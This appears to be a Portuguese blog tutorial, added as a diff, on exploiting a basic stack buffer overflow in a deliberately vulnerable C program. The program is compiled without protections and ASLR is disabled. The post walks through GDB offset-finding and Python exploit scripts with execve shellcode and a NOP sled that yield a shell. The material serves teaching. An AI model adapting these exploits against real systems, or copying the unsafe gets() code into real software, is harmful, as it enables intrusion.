@@ -1,0 +1,211 @@
+<p>Dando continuidade ao estudo sobre <strong>buffer overflow</strong>, nesta parte exploraremos de fato o primeiro binário.</p>
+
+<h2 id="simples-buffer-overflow">Simples Buffer Overflow</h2>
+
+<p>Para fins de entendimento de como ocorre a corrupção de memória através do <em>buffer overflow</em>, esta primeira parte será realizada com um binário sem nenhuma proteção. Este experimento dará uma visão de como o programa é executado a nível de memória e como é possível executar um shellcode a partir da <em>Stack</em>.
+Para que o ASLR seja desativado, é preciso executar o comando abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo </span>0 | <span class="nb">sudo tee</span> /proc/sys/kernel/randomize_va_space 
+</code></pre></div></div>
+<h3 id="analisando-o-código-fonte">Analisando o código fonte</h3>
+
+<p>Nem sempre em um cenário real, é possível ter acesso ao código fonte do binário a ser explorado, porém, a fins de estudo, o código fonte do binário está abaixo:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$ cat prog.c</code></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+
+        <span class="kt">char</span> <span class="n">c</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+        <span class="n">puts</span><span class="p">(</span><span class="s">"Me alimente: "</span><span class="p">);</span>
+        <span class="n">gets</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Vc escreveu: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+
+        <span class="n">vuln</span><span class="p">();</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Ao analisar a função <code class="language-plaintext highlighter-rouge">vuln</code>, épossível perceber que ela cria um <em>buffer</em> de <strong>40 bytes</strong>, logo em seguida, a função <code class="language-plaintext highlighter-rouge">gets</code> preenche o <em>buffer</em> criado com o <em>input</em> do usuário.
+O problema da função <code class="language-plaintext highlighter-rouge">gets</code>, é que ela não faz nenhum tratamento no <em>buffer</em> de entrada para validar seu tamanho, podendo aceitar uma quantidade de <em>bytes</em> muito maior que os 40 setados inicialmente.</p>
+
+<h3 id="compilando-o-binário">Compilando o binário</h3>
+
+<p>Para que a exploração ocorra de fato, é necessário a compilação do script em um binário, desativando todas as proteções através do comando abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc prog.c <span class="nt">-o</span> prog <span class="nt">-z</span> execstack <span class="nt">-fno-stack-protector</span> <span class="nt">-no-pie</span> <span class="nt">-w</span>
+</code></pre></div></div>
+
+<h3 id="enumerando-o-binário">Enumerando o binário</h3>
+
+<p>Após a compilação, pode-se executar o binário e enumerar seu comportamento:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./prog 
+Me alimente: 
+AAAAAAAA
+Vc escreveu: AAAAAAAA
+</code></pre></div></div>
+<p>O programa solicita dados de entrada, e após o envio, retorna a resposta com o <em>buffer</em>. Ao preencher um <em>buffer</em> maior que o esperado, o programa tem o seguinte comportamento:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./prog                                                                                                      
+Me alimente: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Vc escreveu: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAA
+zsh: segmentation fault  ./prog
+</code></pre></div></div>
+<p>O programa respondeu com o erro <code class="language-plaintext highlighter-rouge">"segmentation fault"</code>. Isto ocorre, pois o buffer de entrada foi maior que 40 bytes, sobresccrevendo outros endereços de memória com “A”, fazendo com que o programa não saiba o que executar após a função <code class="language-plaintext highlighter-rouge">vuln</code>.</p>
+
+<h3 id="debugando-o-binário">Debugando o binário</h3>
+
+<p>Uma vez constatado a vulnerabilidade de <em>buffer overflow</em>, pode-se utilizar o <code class="language-plaintext highlighter-rouge">Debugger GDB</code> para verificar o comportamento do programa em nível de memória. Para iniciar, é preciso executar o comando abaixo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gdb prog
+</code></pre></div></div>
+<p>Ao insrir o comando <code class="language-plaintext highlighter-rouge">info functions</code>, todas as funções do programa são listadas, conforme a imagem abaixo:</p>
+
+<p><img src="/img/std/linbof/gdb-1.png" alt="Funções do programa exibidas pelo GDB." /></p>
+
+<p>Para iniciar o debug, é preciso inserir um <em>breakpoint</em> na função <code class="language-plaintext highlighter-rouge">main</code> através do comando <code class="language-plaintext highlighter-rouge">b main</code>. Em seguida executar o programa no GDB com o comando <code class="language-plaintext highlighter-rouge">run</code>. Após a execução dos comandos, é possível ter o <em>overview</em> dos registradores no início da execução, conforme imagem abaixo:</p>
+
+<p><img src="/img/std/linbof/gdb-2.png" alt="Overview dos registradores no início da execução do programa." /></p>
+
+<p>Neste ponto da execução, é possível “disassemblar” a função <code class="language-plaintext highlighter-rouge">vuln</code> e verificar os endereços de memória de cada passo com o comando <code class="language-plaintext highlighter-rouge">disas vuln</code>.</p>
+
+<p><img src="/img/std/linbof/gdb-3.png" alt="Disassembly da função vuln" /></p>
+
+<p>É possível inserir mais um <em>breakpoint</em>, desta vez na chamada <code class="language-plaintext highlighter-rouge">ret</code> da função <code class="language-plaintext highlighter-rouge">vuln</code>, que neste caso está no endereço de memória <code class="language-plaintext highlighter-rouge">0x0000000000401181</code>. Esta chamada retorna para a execução normal do programa após receber o <em>buffer</em> de entrada. Ao setar um <em>breakpoint</em> nesta chamada, é possível analisar os registradores neste exato momento. O <em>breakpoint</em> pode ser setado com o comando <code class="language-plaintext highlighter-rouge">b * 0x0000000000401181</code>.</p>
+
+<p>Após setar o <em>breakpoint</em>, o programa deve continuar sua execução com o comando <code class="language-plaintext highlighter-rouge">continue</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>b <span class="k">*</span> 0x0000000000401181
+Breakpoint 2 at 0x401181
+gdb-peda<span class="nv">$ </span><span class="k">continue
+</span>Continuing.
+Me alimente: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre></div></div>
+
+<p>Após preencher o <em>buffer</em> com uma grande quantidade de dados, pode-se continuar a execução com o comando <code class="language-plaintext highlighter-rouge">continue</code>.</p>
+
+<p><img src="/img/std/linbof/gdb-4.png" alt="Execução do programa parada com o erro &quot;SIGSEGV&quot;." /></p>
+
+<p>Conforme observado, o programa parou com o erro <code class="language-plaintext highlighter-rouge">segmentation fault</code>. Se o proximo comando a ser executado, que se encontra no topo da pilha, for consultado, pode-se verificar que ele está preenchido com <code class="language-plaintext highlighter-rouge">0x4141414141414141</code> (41= A em hexadecimal). O <strong>RSP</strong> pode ser consultado com o comando <code class="language-plaintext highlighter-rouge">x/gx $rsp</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/gx <span class="nv">$rsp</span>
+0x7fffffffded8: 0x4141414141414141
+</code></pre></div></div>
+
+<h3 id="encontrando-o-offset">Encontrando o offset</h3>
+
+<p>Através da análise do código fonte, é possível identificar que o <em>buffer</em> alocado para a função <code class="language-plaintext highlighter-rouge">vuln</code> é de 40 bytes, porém, devido aos movimentos de registradores, o buffer para se atingir o <strong>RSP</strong> é diferente. Para se descobrir o <em>offset</em> para atingir o endereço desejado, é preciso enviar para o programa um <strong>ciclic pattern</strong>, ou seja, uma cadeia de caracteres que pode ser rastreado para identificarmos o endereço correto.
+Para criar este <em>ciclic pattern</em>, podemos utilizar o programa <code class="language-plaintext highlighter-rouge">msf-pattern_create</code> da suide <em>Metasploit Framework</em>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msf-pattern_create <span class="nt">-l</span> 80
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1
+Ac2Ac3Ac4Ac5Ac
+</code></pre></div></div>
+
+<p>Este comando cria um <em>ciclic pattern</em> de 80 bytes que pode ser enviado para o programa sendo executado no GDB.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span><span class="k">continue
+</span>Continuing.
+Me alimente: 
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1
+Ac2Ac3Ac4Ac5Ac
+Vc escreveu: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab
+7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac
+</code></pre></div></div>
+<p>Ao consultar o endereço de <strong>RSP</strong> que causou o erro no programa, é possível encontrar os bytes resultantes.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/gx <span class="nv">$rsp</span>
+0x7fffffffded8: 0x4130634139624138
+</code></pre></div></div>
+
+<p>Com o endereço resultante é possível utilizar o programa <em>msf-pattern_offset</em>, também da suite <em>Metasploit Framework</em>, para consultar o <em>offset</em> resultante do endereço.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msf-pattern_offset <span class="nt">-l</span> 80 <span class="nt">-q</span> 0x4130634139624138
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 56
+</code></pre></div></div>
+
+<p>O <em>offset</em> para atingir <strong>RIP</strong> é de 56 bytes. Pode-se testar este <em>offset</em> ao enviar novamente um <em>buffer</em> para o programa sendo executado no GDB, contndo 56 letras A e 8 letras B. Ao consultar o endereço resultante em <strong>RSP</strong>, ele estará preenchido com o valor <code class="language-plaintext highlighter-rouge">0x4242424242424242</code> (42 = B em hexadecimal).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/gx <span class="nv">$rsp</span>
+0x7fffffffded8: 0x4242424242424242
+</code></pre></div></div>
+<p>A partir destas descobertas, é possível ter total controle da execução do binário.</p>
+
+<h3 id="explorando-o-binário">Explorando o binário</h3>
+
+<p>Para a exploração do binário, inicialmente será necessário um script em <code class="language-plaintext highlighter-rouge">python 2</code>. O motivo pelo qual será utilizado uma versão antiga da linguagem, se dá pelo fado desta versão imprimir bytes na tela, enquanto o <code class="language-plaintext highlighter-rouge">python 3</code> descontinuou esta função. Porém, para as próximas explorações com <em>bypass</em> das proteções, o Python 3 será utilizado.</p>
+
+<p>Com o offset correto, é preciso encontrar um “endereço de retorno” válido para o programa, ou seja, após o <em>buffer</em> de 56 bytes, é preciso informar um endereço válido para o programa, de forma que ele não entre em <em>segmentation fault</em>. Este endereço pode ser consultado no próprio GDB, uma vez que o <em>breakpoint</em> foi setado no endereço de retorno da função <code class="language-plaintext highlighter-rouge">vuln</code>, o próximo endereço da <em>Stack</em> pode ser usado.
+Uma vez que o ASLR foi desabilitado, qualquer endereço de memória permanecerá o mesmo em todas as execuções. O endereço de retorno está no topo da <em>Stack</em> conforme a imagem abaixo:</p>
+
+<p><img src="/img/std/linbof/gdb-5.png" alt="Endereço de retorno para o buffer overflow: 0x7fffffffdf00" /></p>
+
+<p>Com o endereço em mãos, e com o <em>shell code</em> em linha de bytes criado anteriormente, pode-se criar o seguinte script:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$ cat exploit.py</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">shell</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73</span><span class="s">
+</span><span class="se">\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6</span><span class="s">
+</span><span class="se">\xb8\x3b\x00\x00\x00\x0f\x05</span><span class="s">"</span>
+
+<span class="c1">#offset
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="c1">#endereco de retorno
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x7fffffffdf00</span><span class="p">)</span>
+<span class="c1">#shellcode
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shell</span>
+
+<span class="k">print</span> <span class="n">payload</span>
+</code></pre></div></div>
+<p>Para enviar o exploit via GDB, pode ser utilizado o comando <code class="language-plaintext highlighter-rouge">r &lt; &lt;(python exploit.py)</code>. Ao executar o binário via GDB enviando este script, é possível obter o retorno de que o programa chamou o <code class="language-plaintext highlighter-rouge">/bin/dash</code>, conforme imagem abaixo:</p>
+
+<p><img src="/img/std/linbof/gdb-6.png" alt="Programa chamando /bin/dash via GDB." /></p>
+
+<p>O exploit está funcional quando é executado por dentro do GDB, pois o endereço de retorno encontrado, considera não so o binário, mas o próŕio GDB. Porém, quando é executado via terminal, existe um decremento não específico dos endereços de memória, como não é possível “adivinhar” este decremento, o script pode ser adaptado com a técnica de <em>NOP Sled</em>.</p>
+
+<h4 id="nop-sled">NOP Sled</h4>
+
+<p>O <em>opcode</em> <code class="language-plaintext highlighter-rouge">NOP</code>, representado pelo byte <code class="language-plaintext highlighter-rouge">\x90</code>, é uma instrução Assembly que não faz absolutamente nada. Quando é inserido uma cadeia de NOPs, o programa simplesmente “desliza” sobre eles. Como não é possível descobrir o decremento dos valores de memória, é possível fazer um acréssimo no endereço de retorno seguido de uma cadeia de NOPs.
+Isto vai fazer com que o endereço de retorno aponte para um lugar bem abaixo da <em>Stack</em>, e logo em seguida o programa vai percorrer os NOPs até o <em>shellcode</em>, fazendo com que o exploit se adapte às diferenças de endereços. O sicript adaptado fica como abaixo:</p>
+
+<p><code class="language-plaintext highlighter-rouge">$ cat exploit.py</code></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="c1">#cadeia de NOPs
+</span><span class="n">nops</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">200</span>
+
+<span class="n">shell</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73</span><span class="s">
+</span><span class="se">\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6</span><span class="s">
+</span><span class="se">\xb8\x3b\x00\x00\x00\x0f\x05</span><span class="s">"</span>
+
+<span class="c1">#offset
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">56</span>
+<span class="n">Endereço</span> <span class="n">de</span> <span class="n">retorno</span> <span class="n">acrescido</span> <span class="n">de</span> <span class="mi">200</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="mh">0x7fffffffdf00</span> <span class="o">+</span> <span class="mi">200</span><span class="p">)</span>
+<span class="c1">#cadeia de NOPs
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">nops</span>
+<span class="c1">#shellcode
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shell</span>
+
+<span class="k">print</span> <span class="n">payload</span>
+</code></pre></div></div>
+<p>Ao executar o exploit enviando o payload para o binário, o endereço de retorno é sobrescrito, levando o programa para a cadeia de NOPs, em seguida o <em>shellcode</em> é executado, uma vez que não existem proteções para este binário, é possível obter um <em>command shell</em>.</p>
+
+<p><img src="/img/std/linbof/shell-obtido-1.png" alt="Command Shell obtido via buffer overflow" /></p>
+
+<p>Com este resultado, foi possível entender o funcionamento básico do processo de exploração de binários via <em>buffer overflow</em> básico. Nas próximas etapas, serão exploradas as técnicas de <em>bypass</em> das proteções comuns.</p>
+
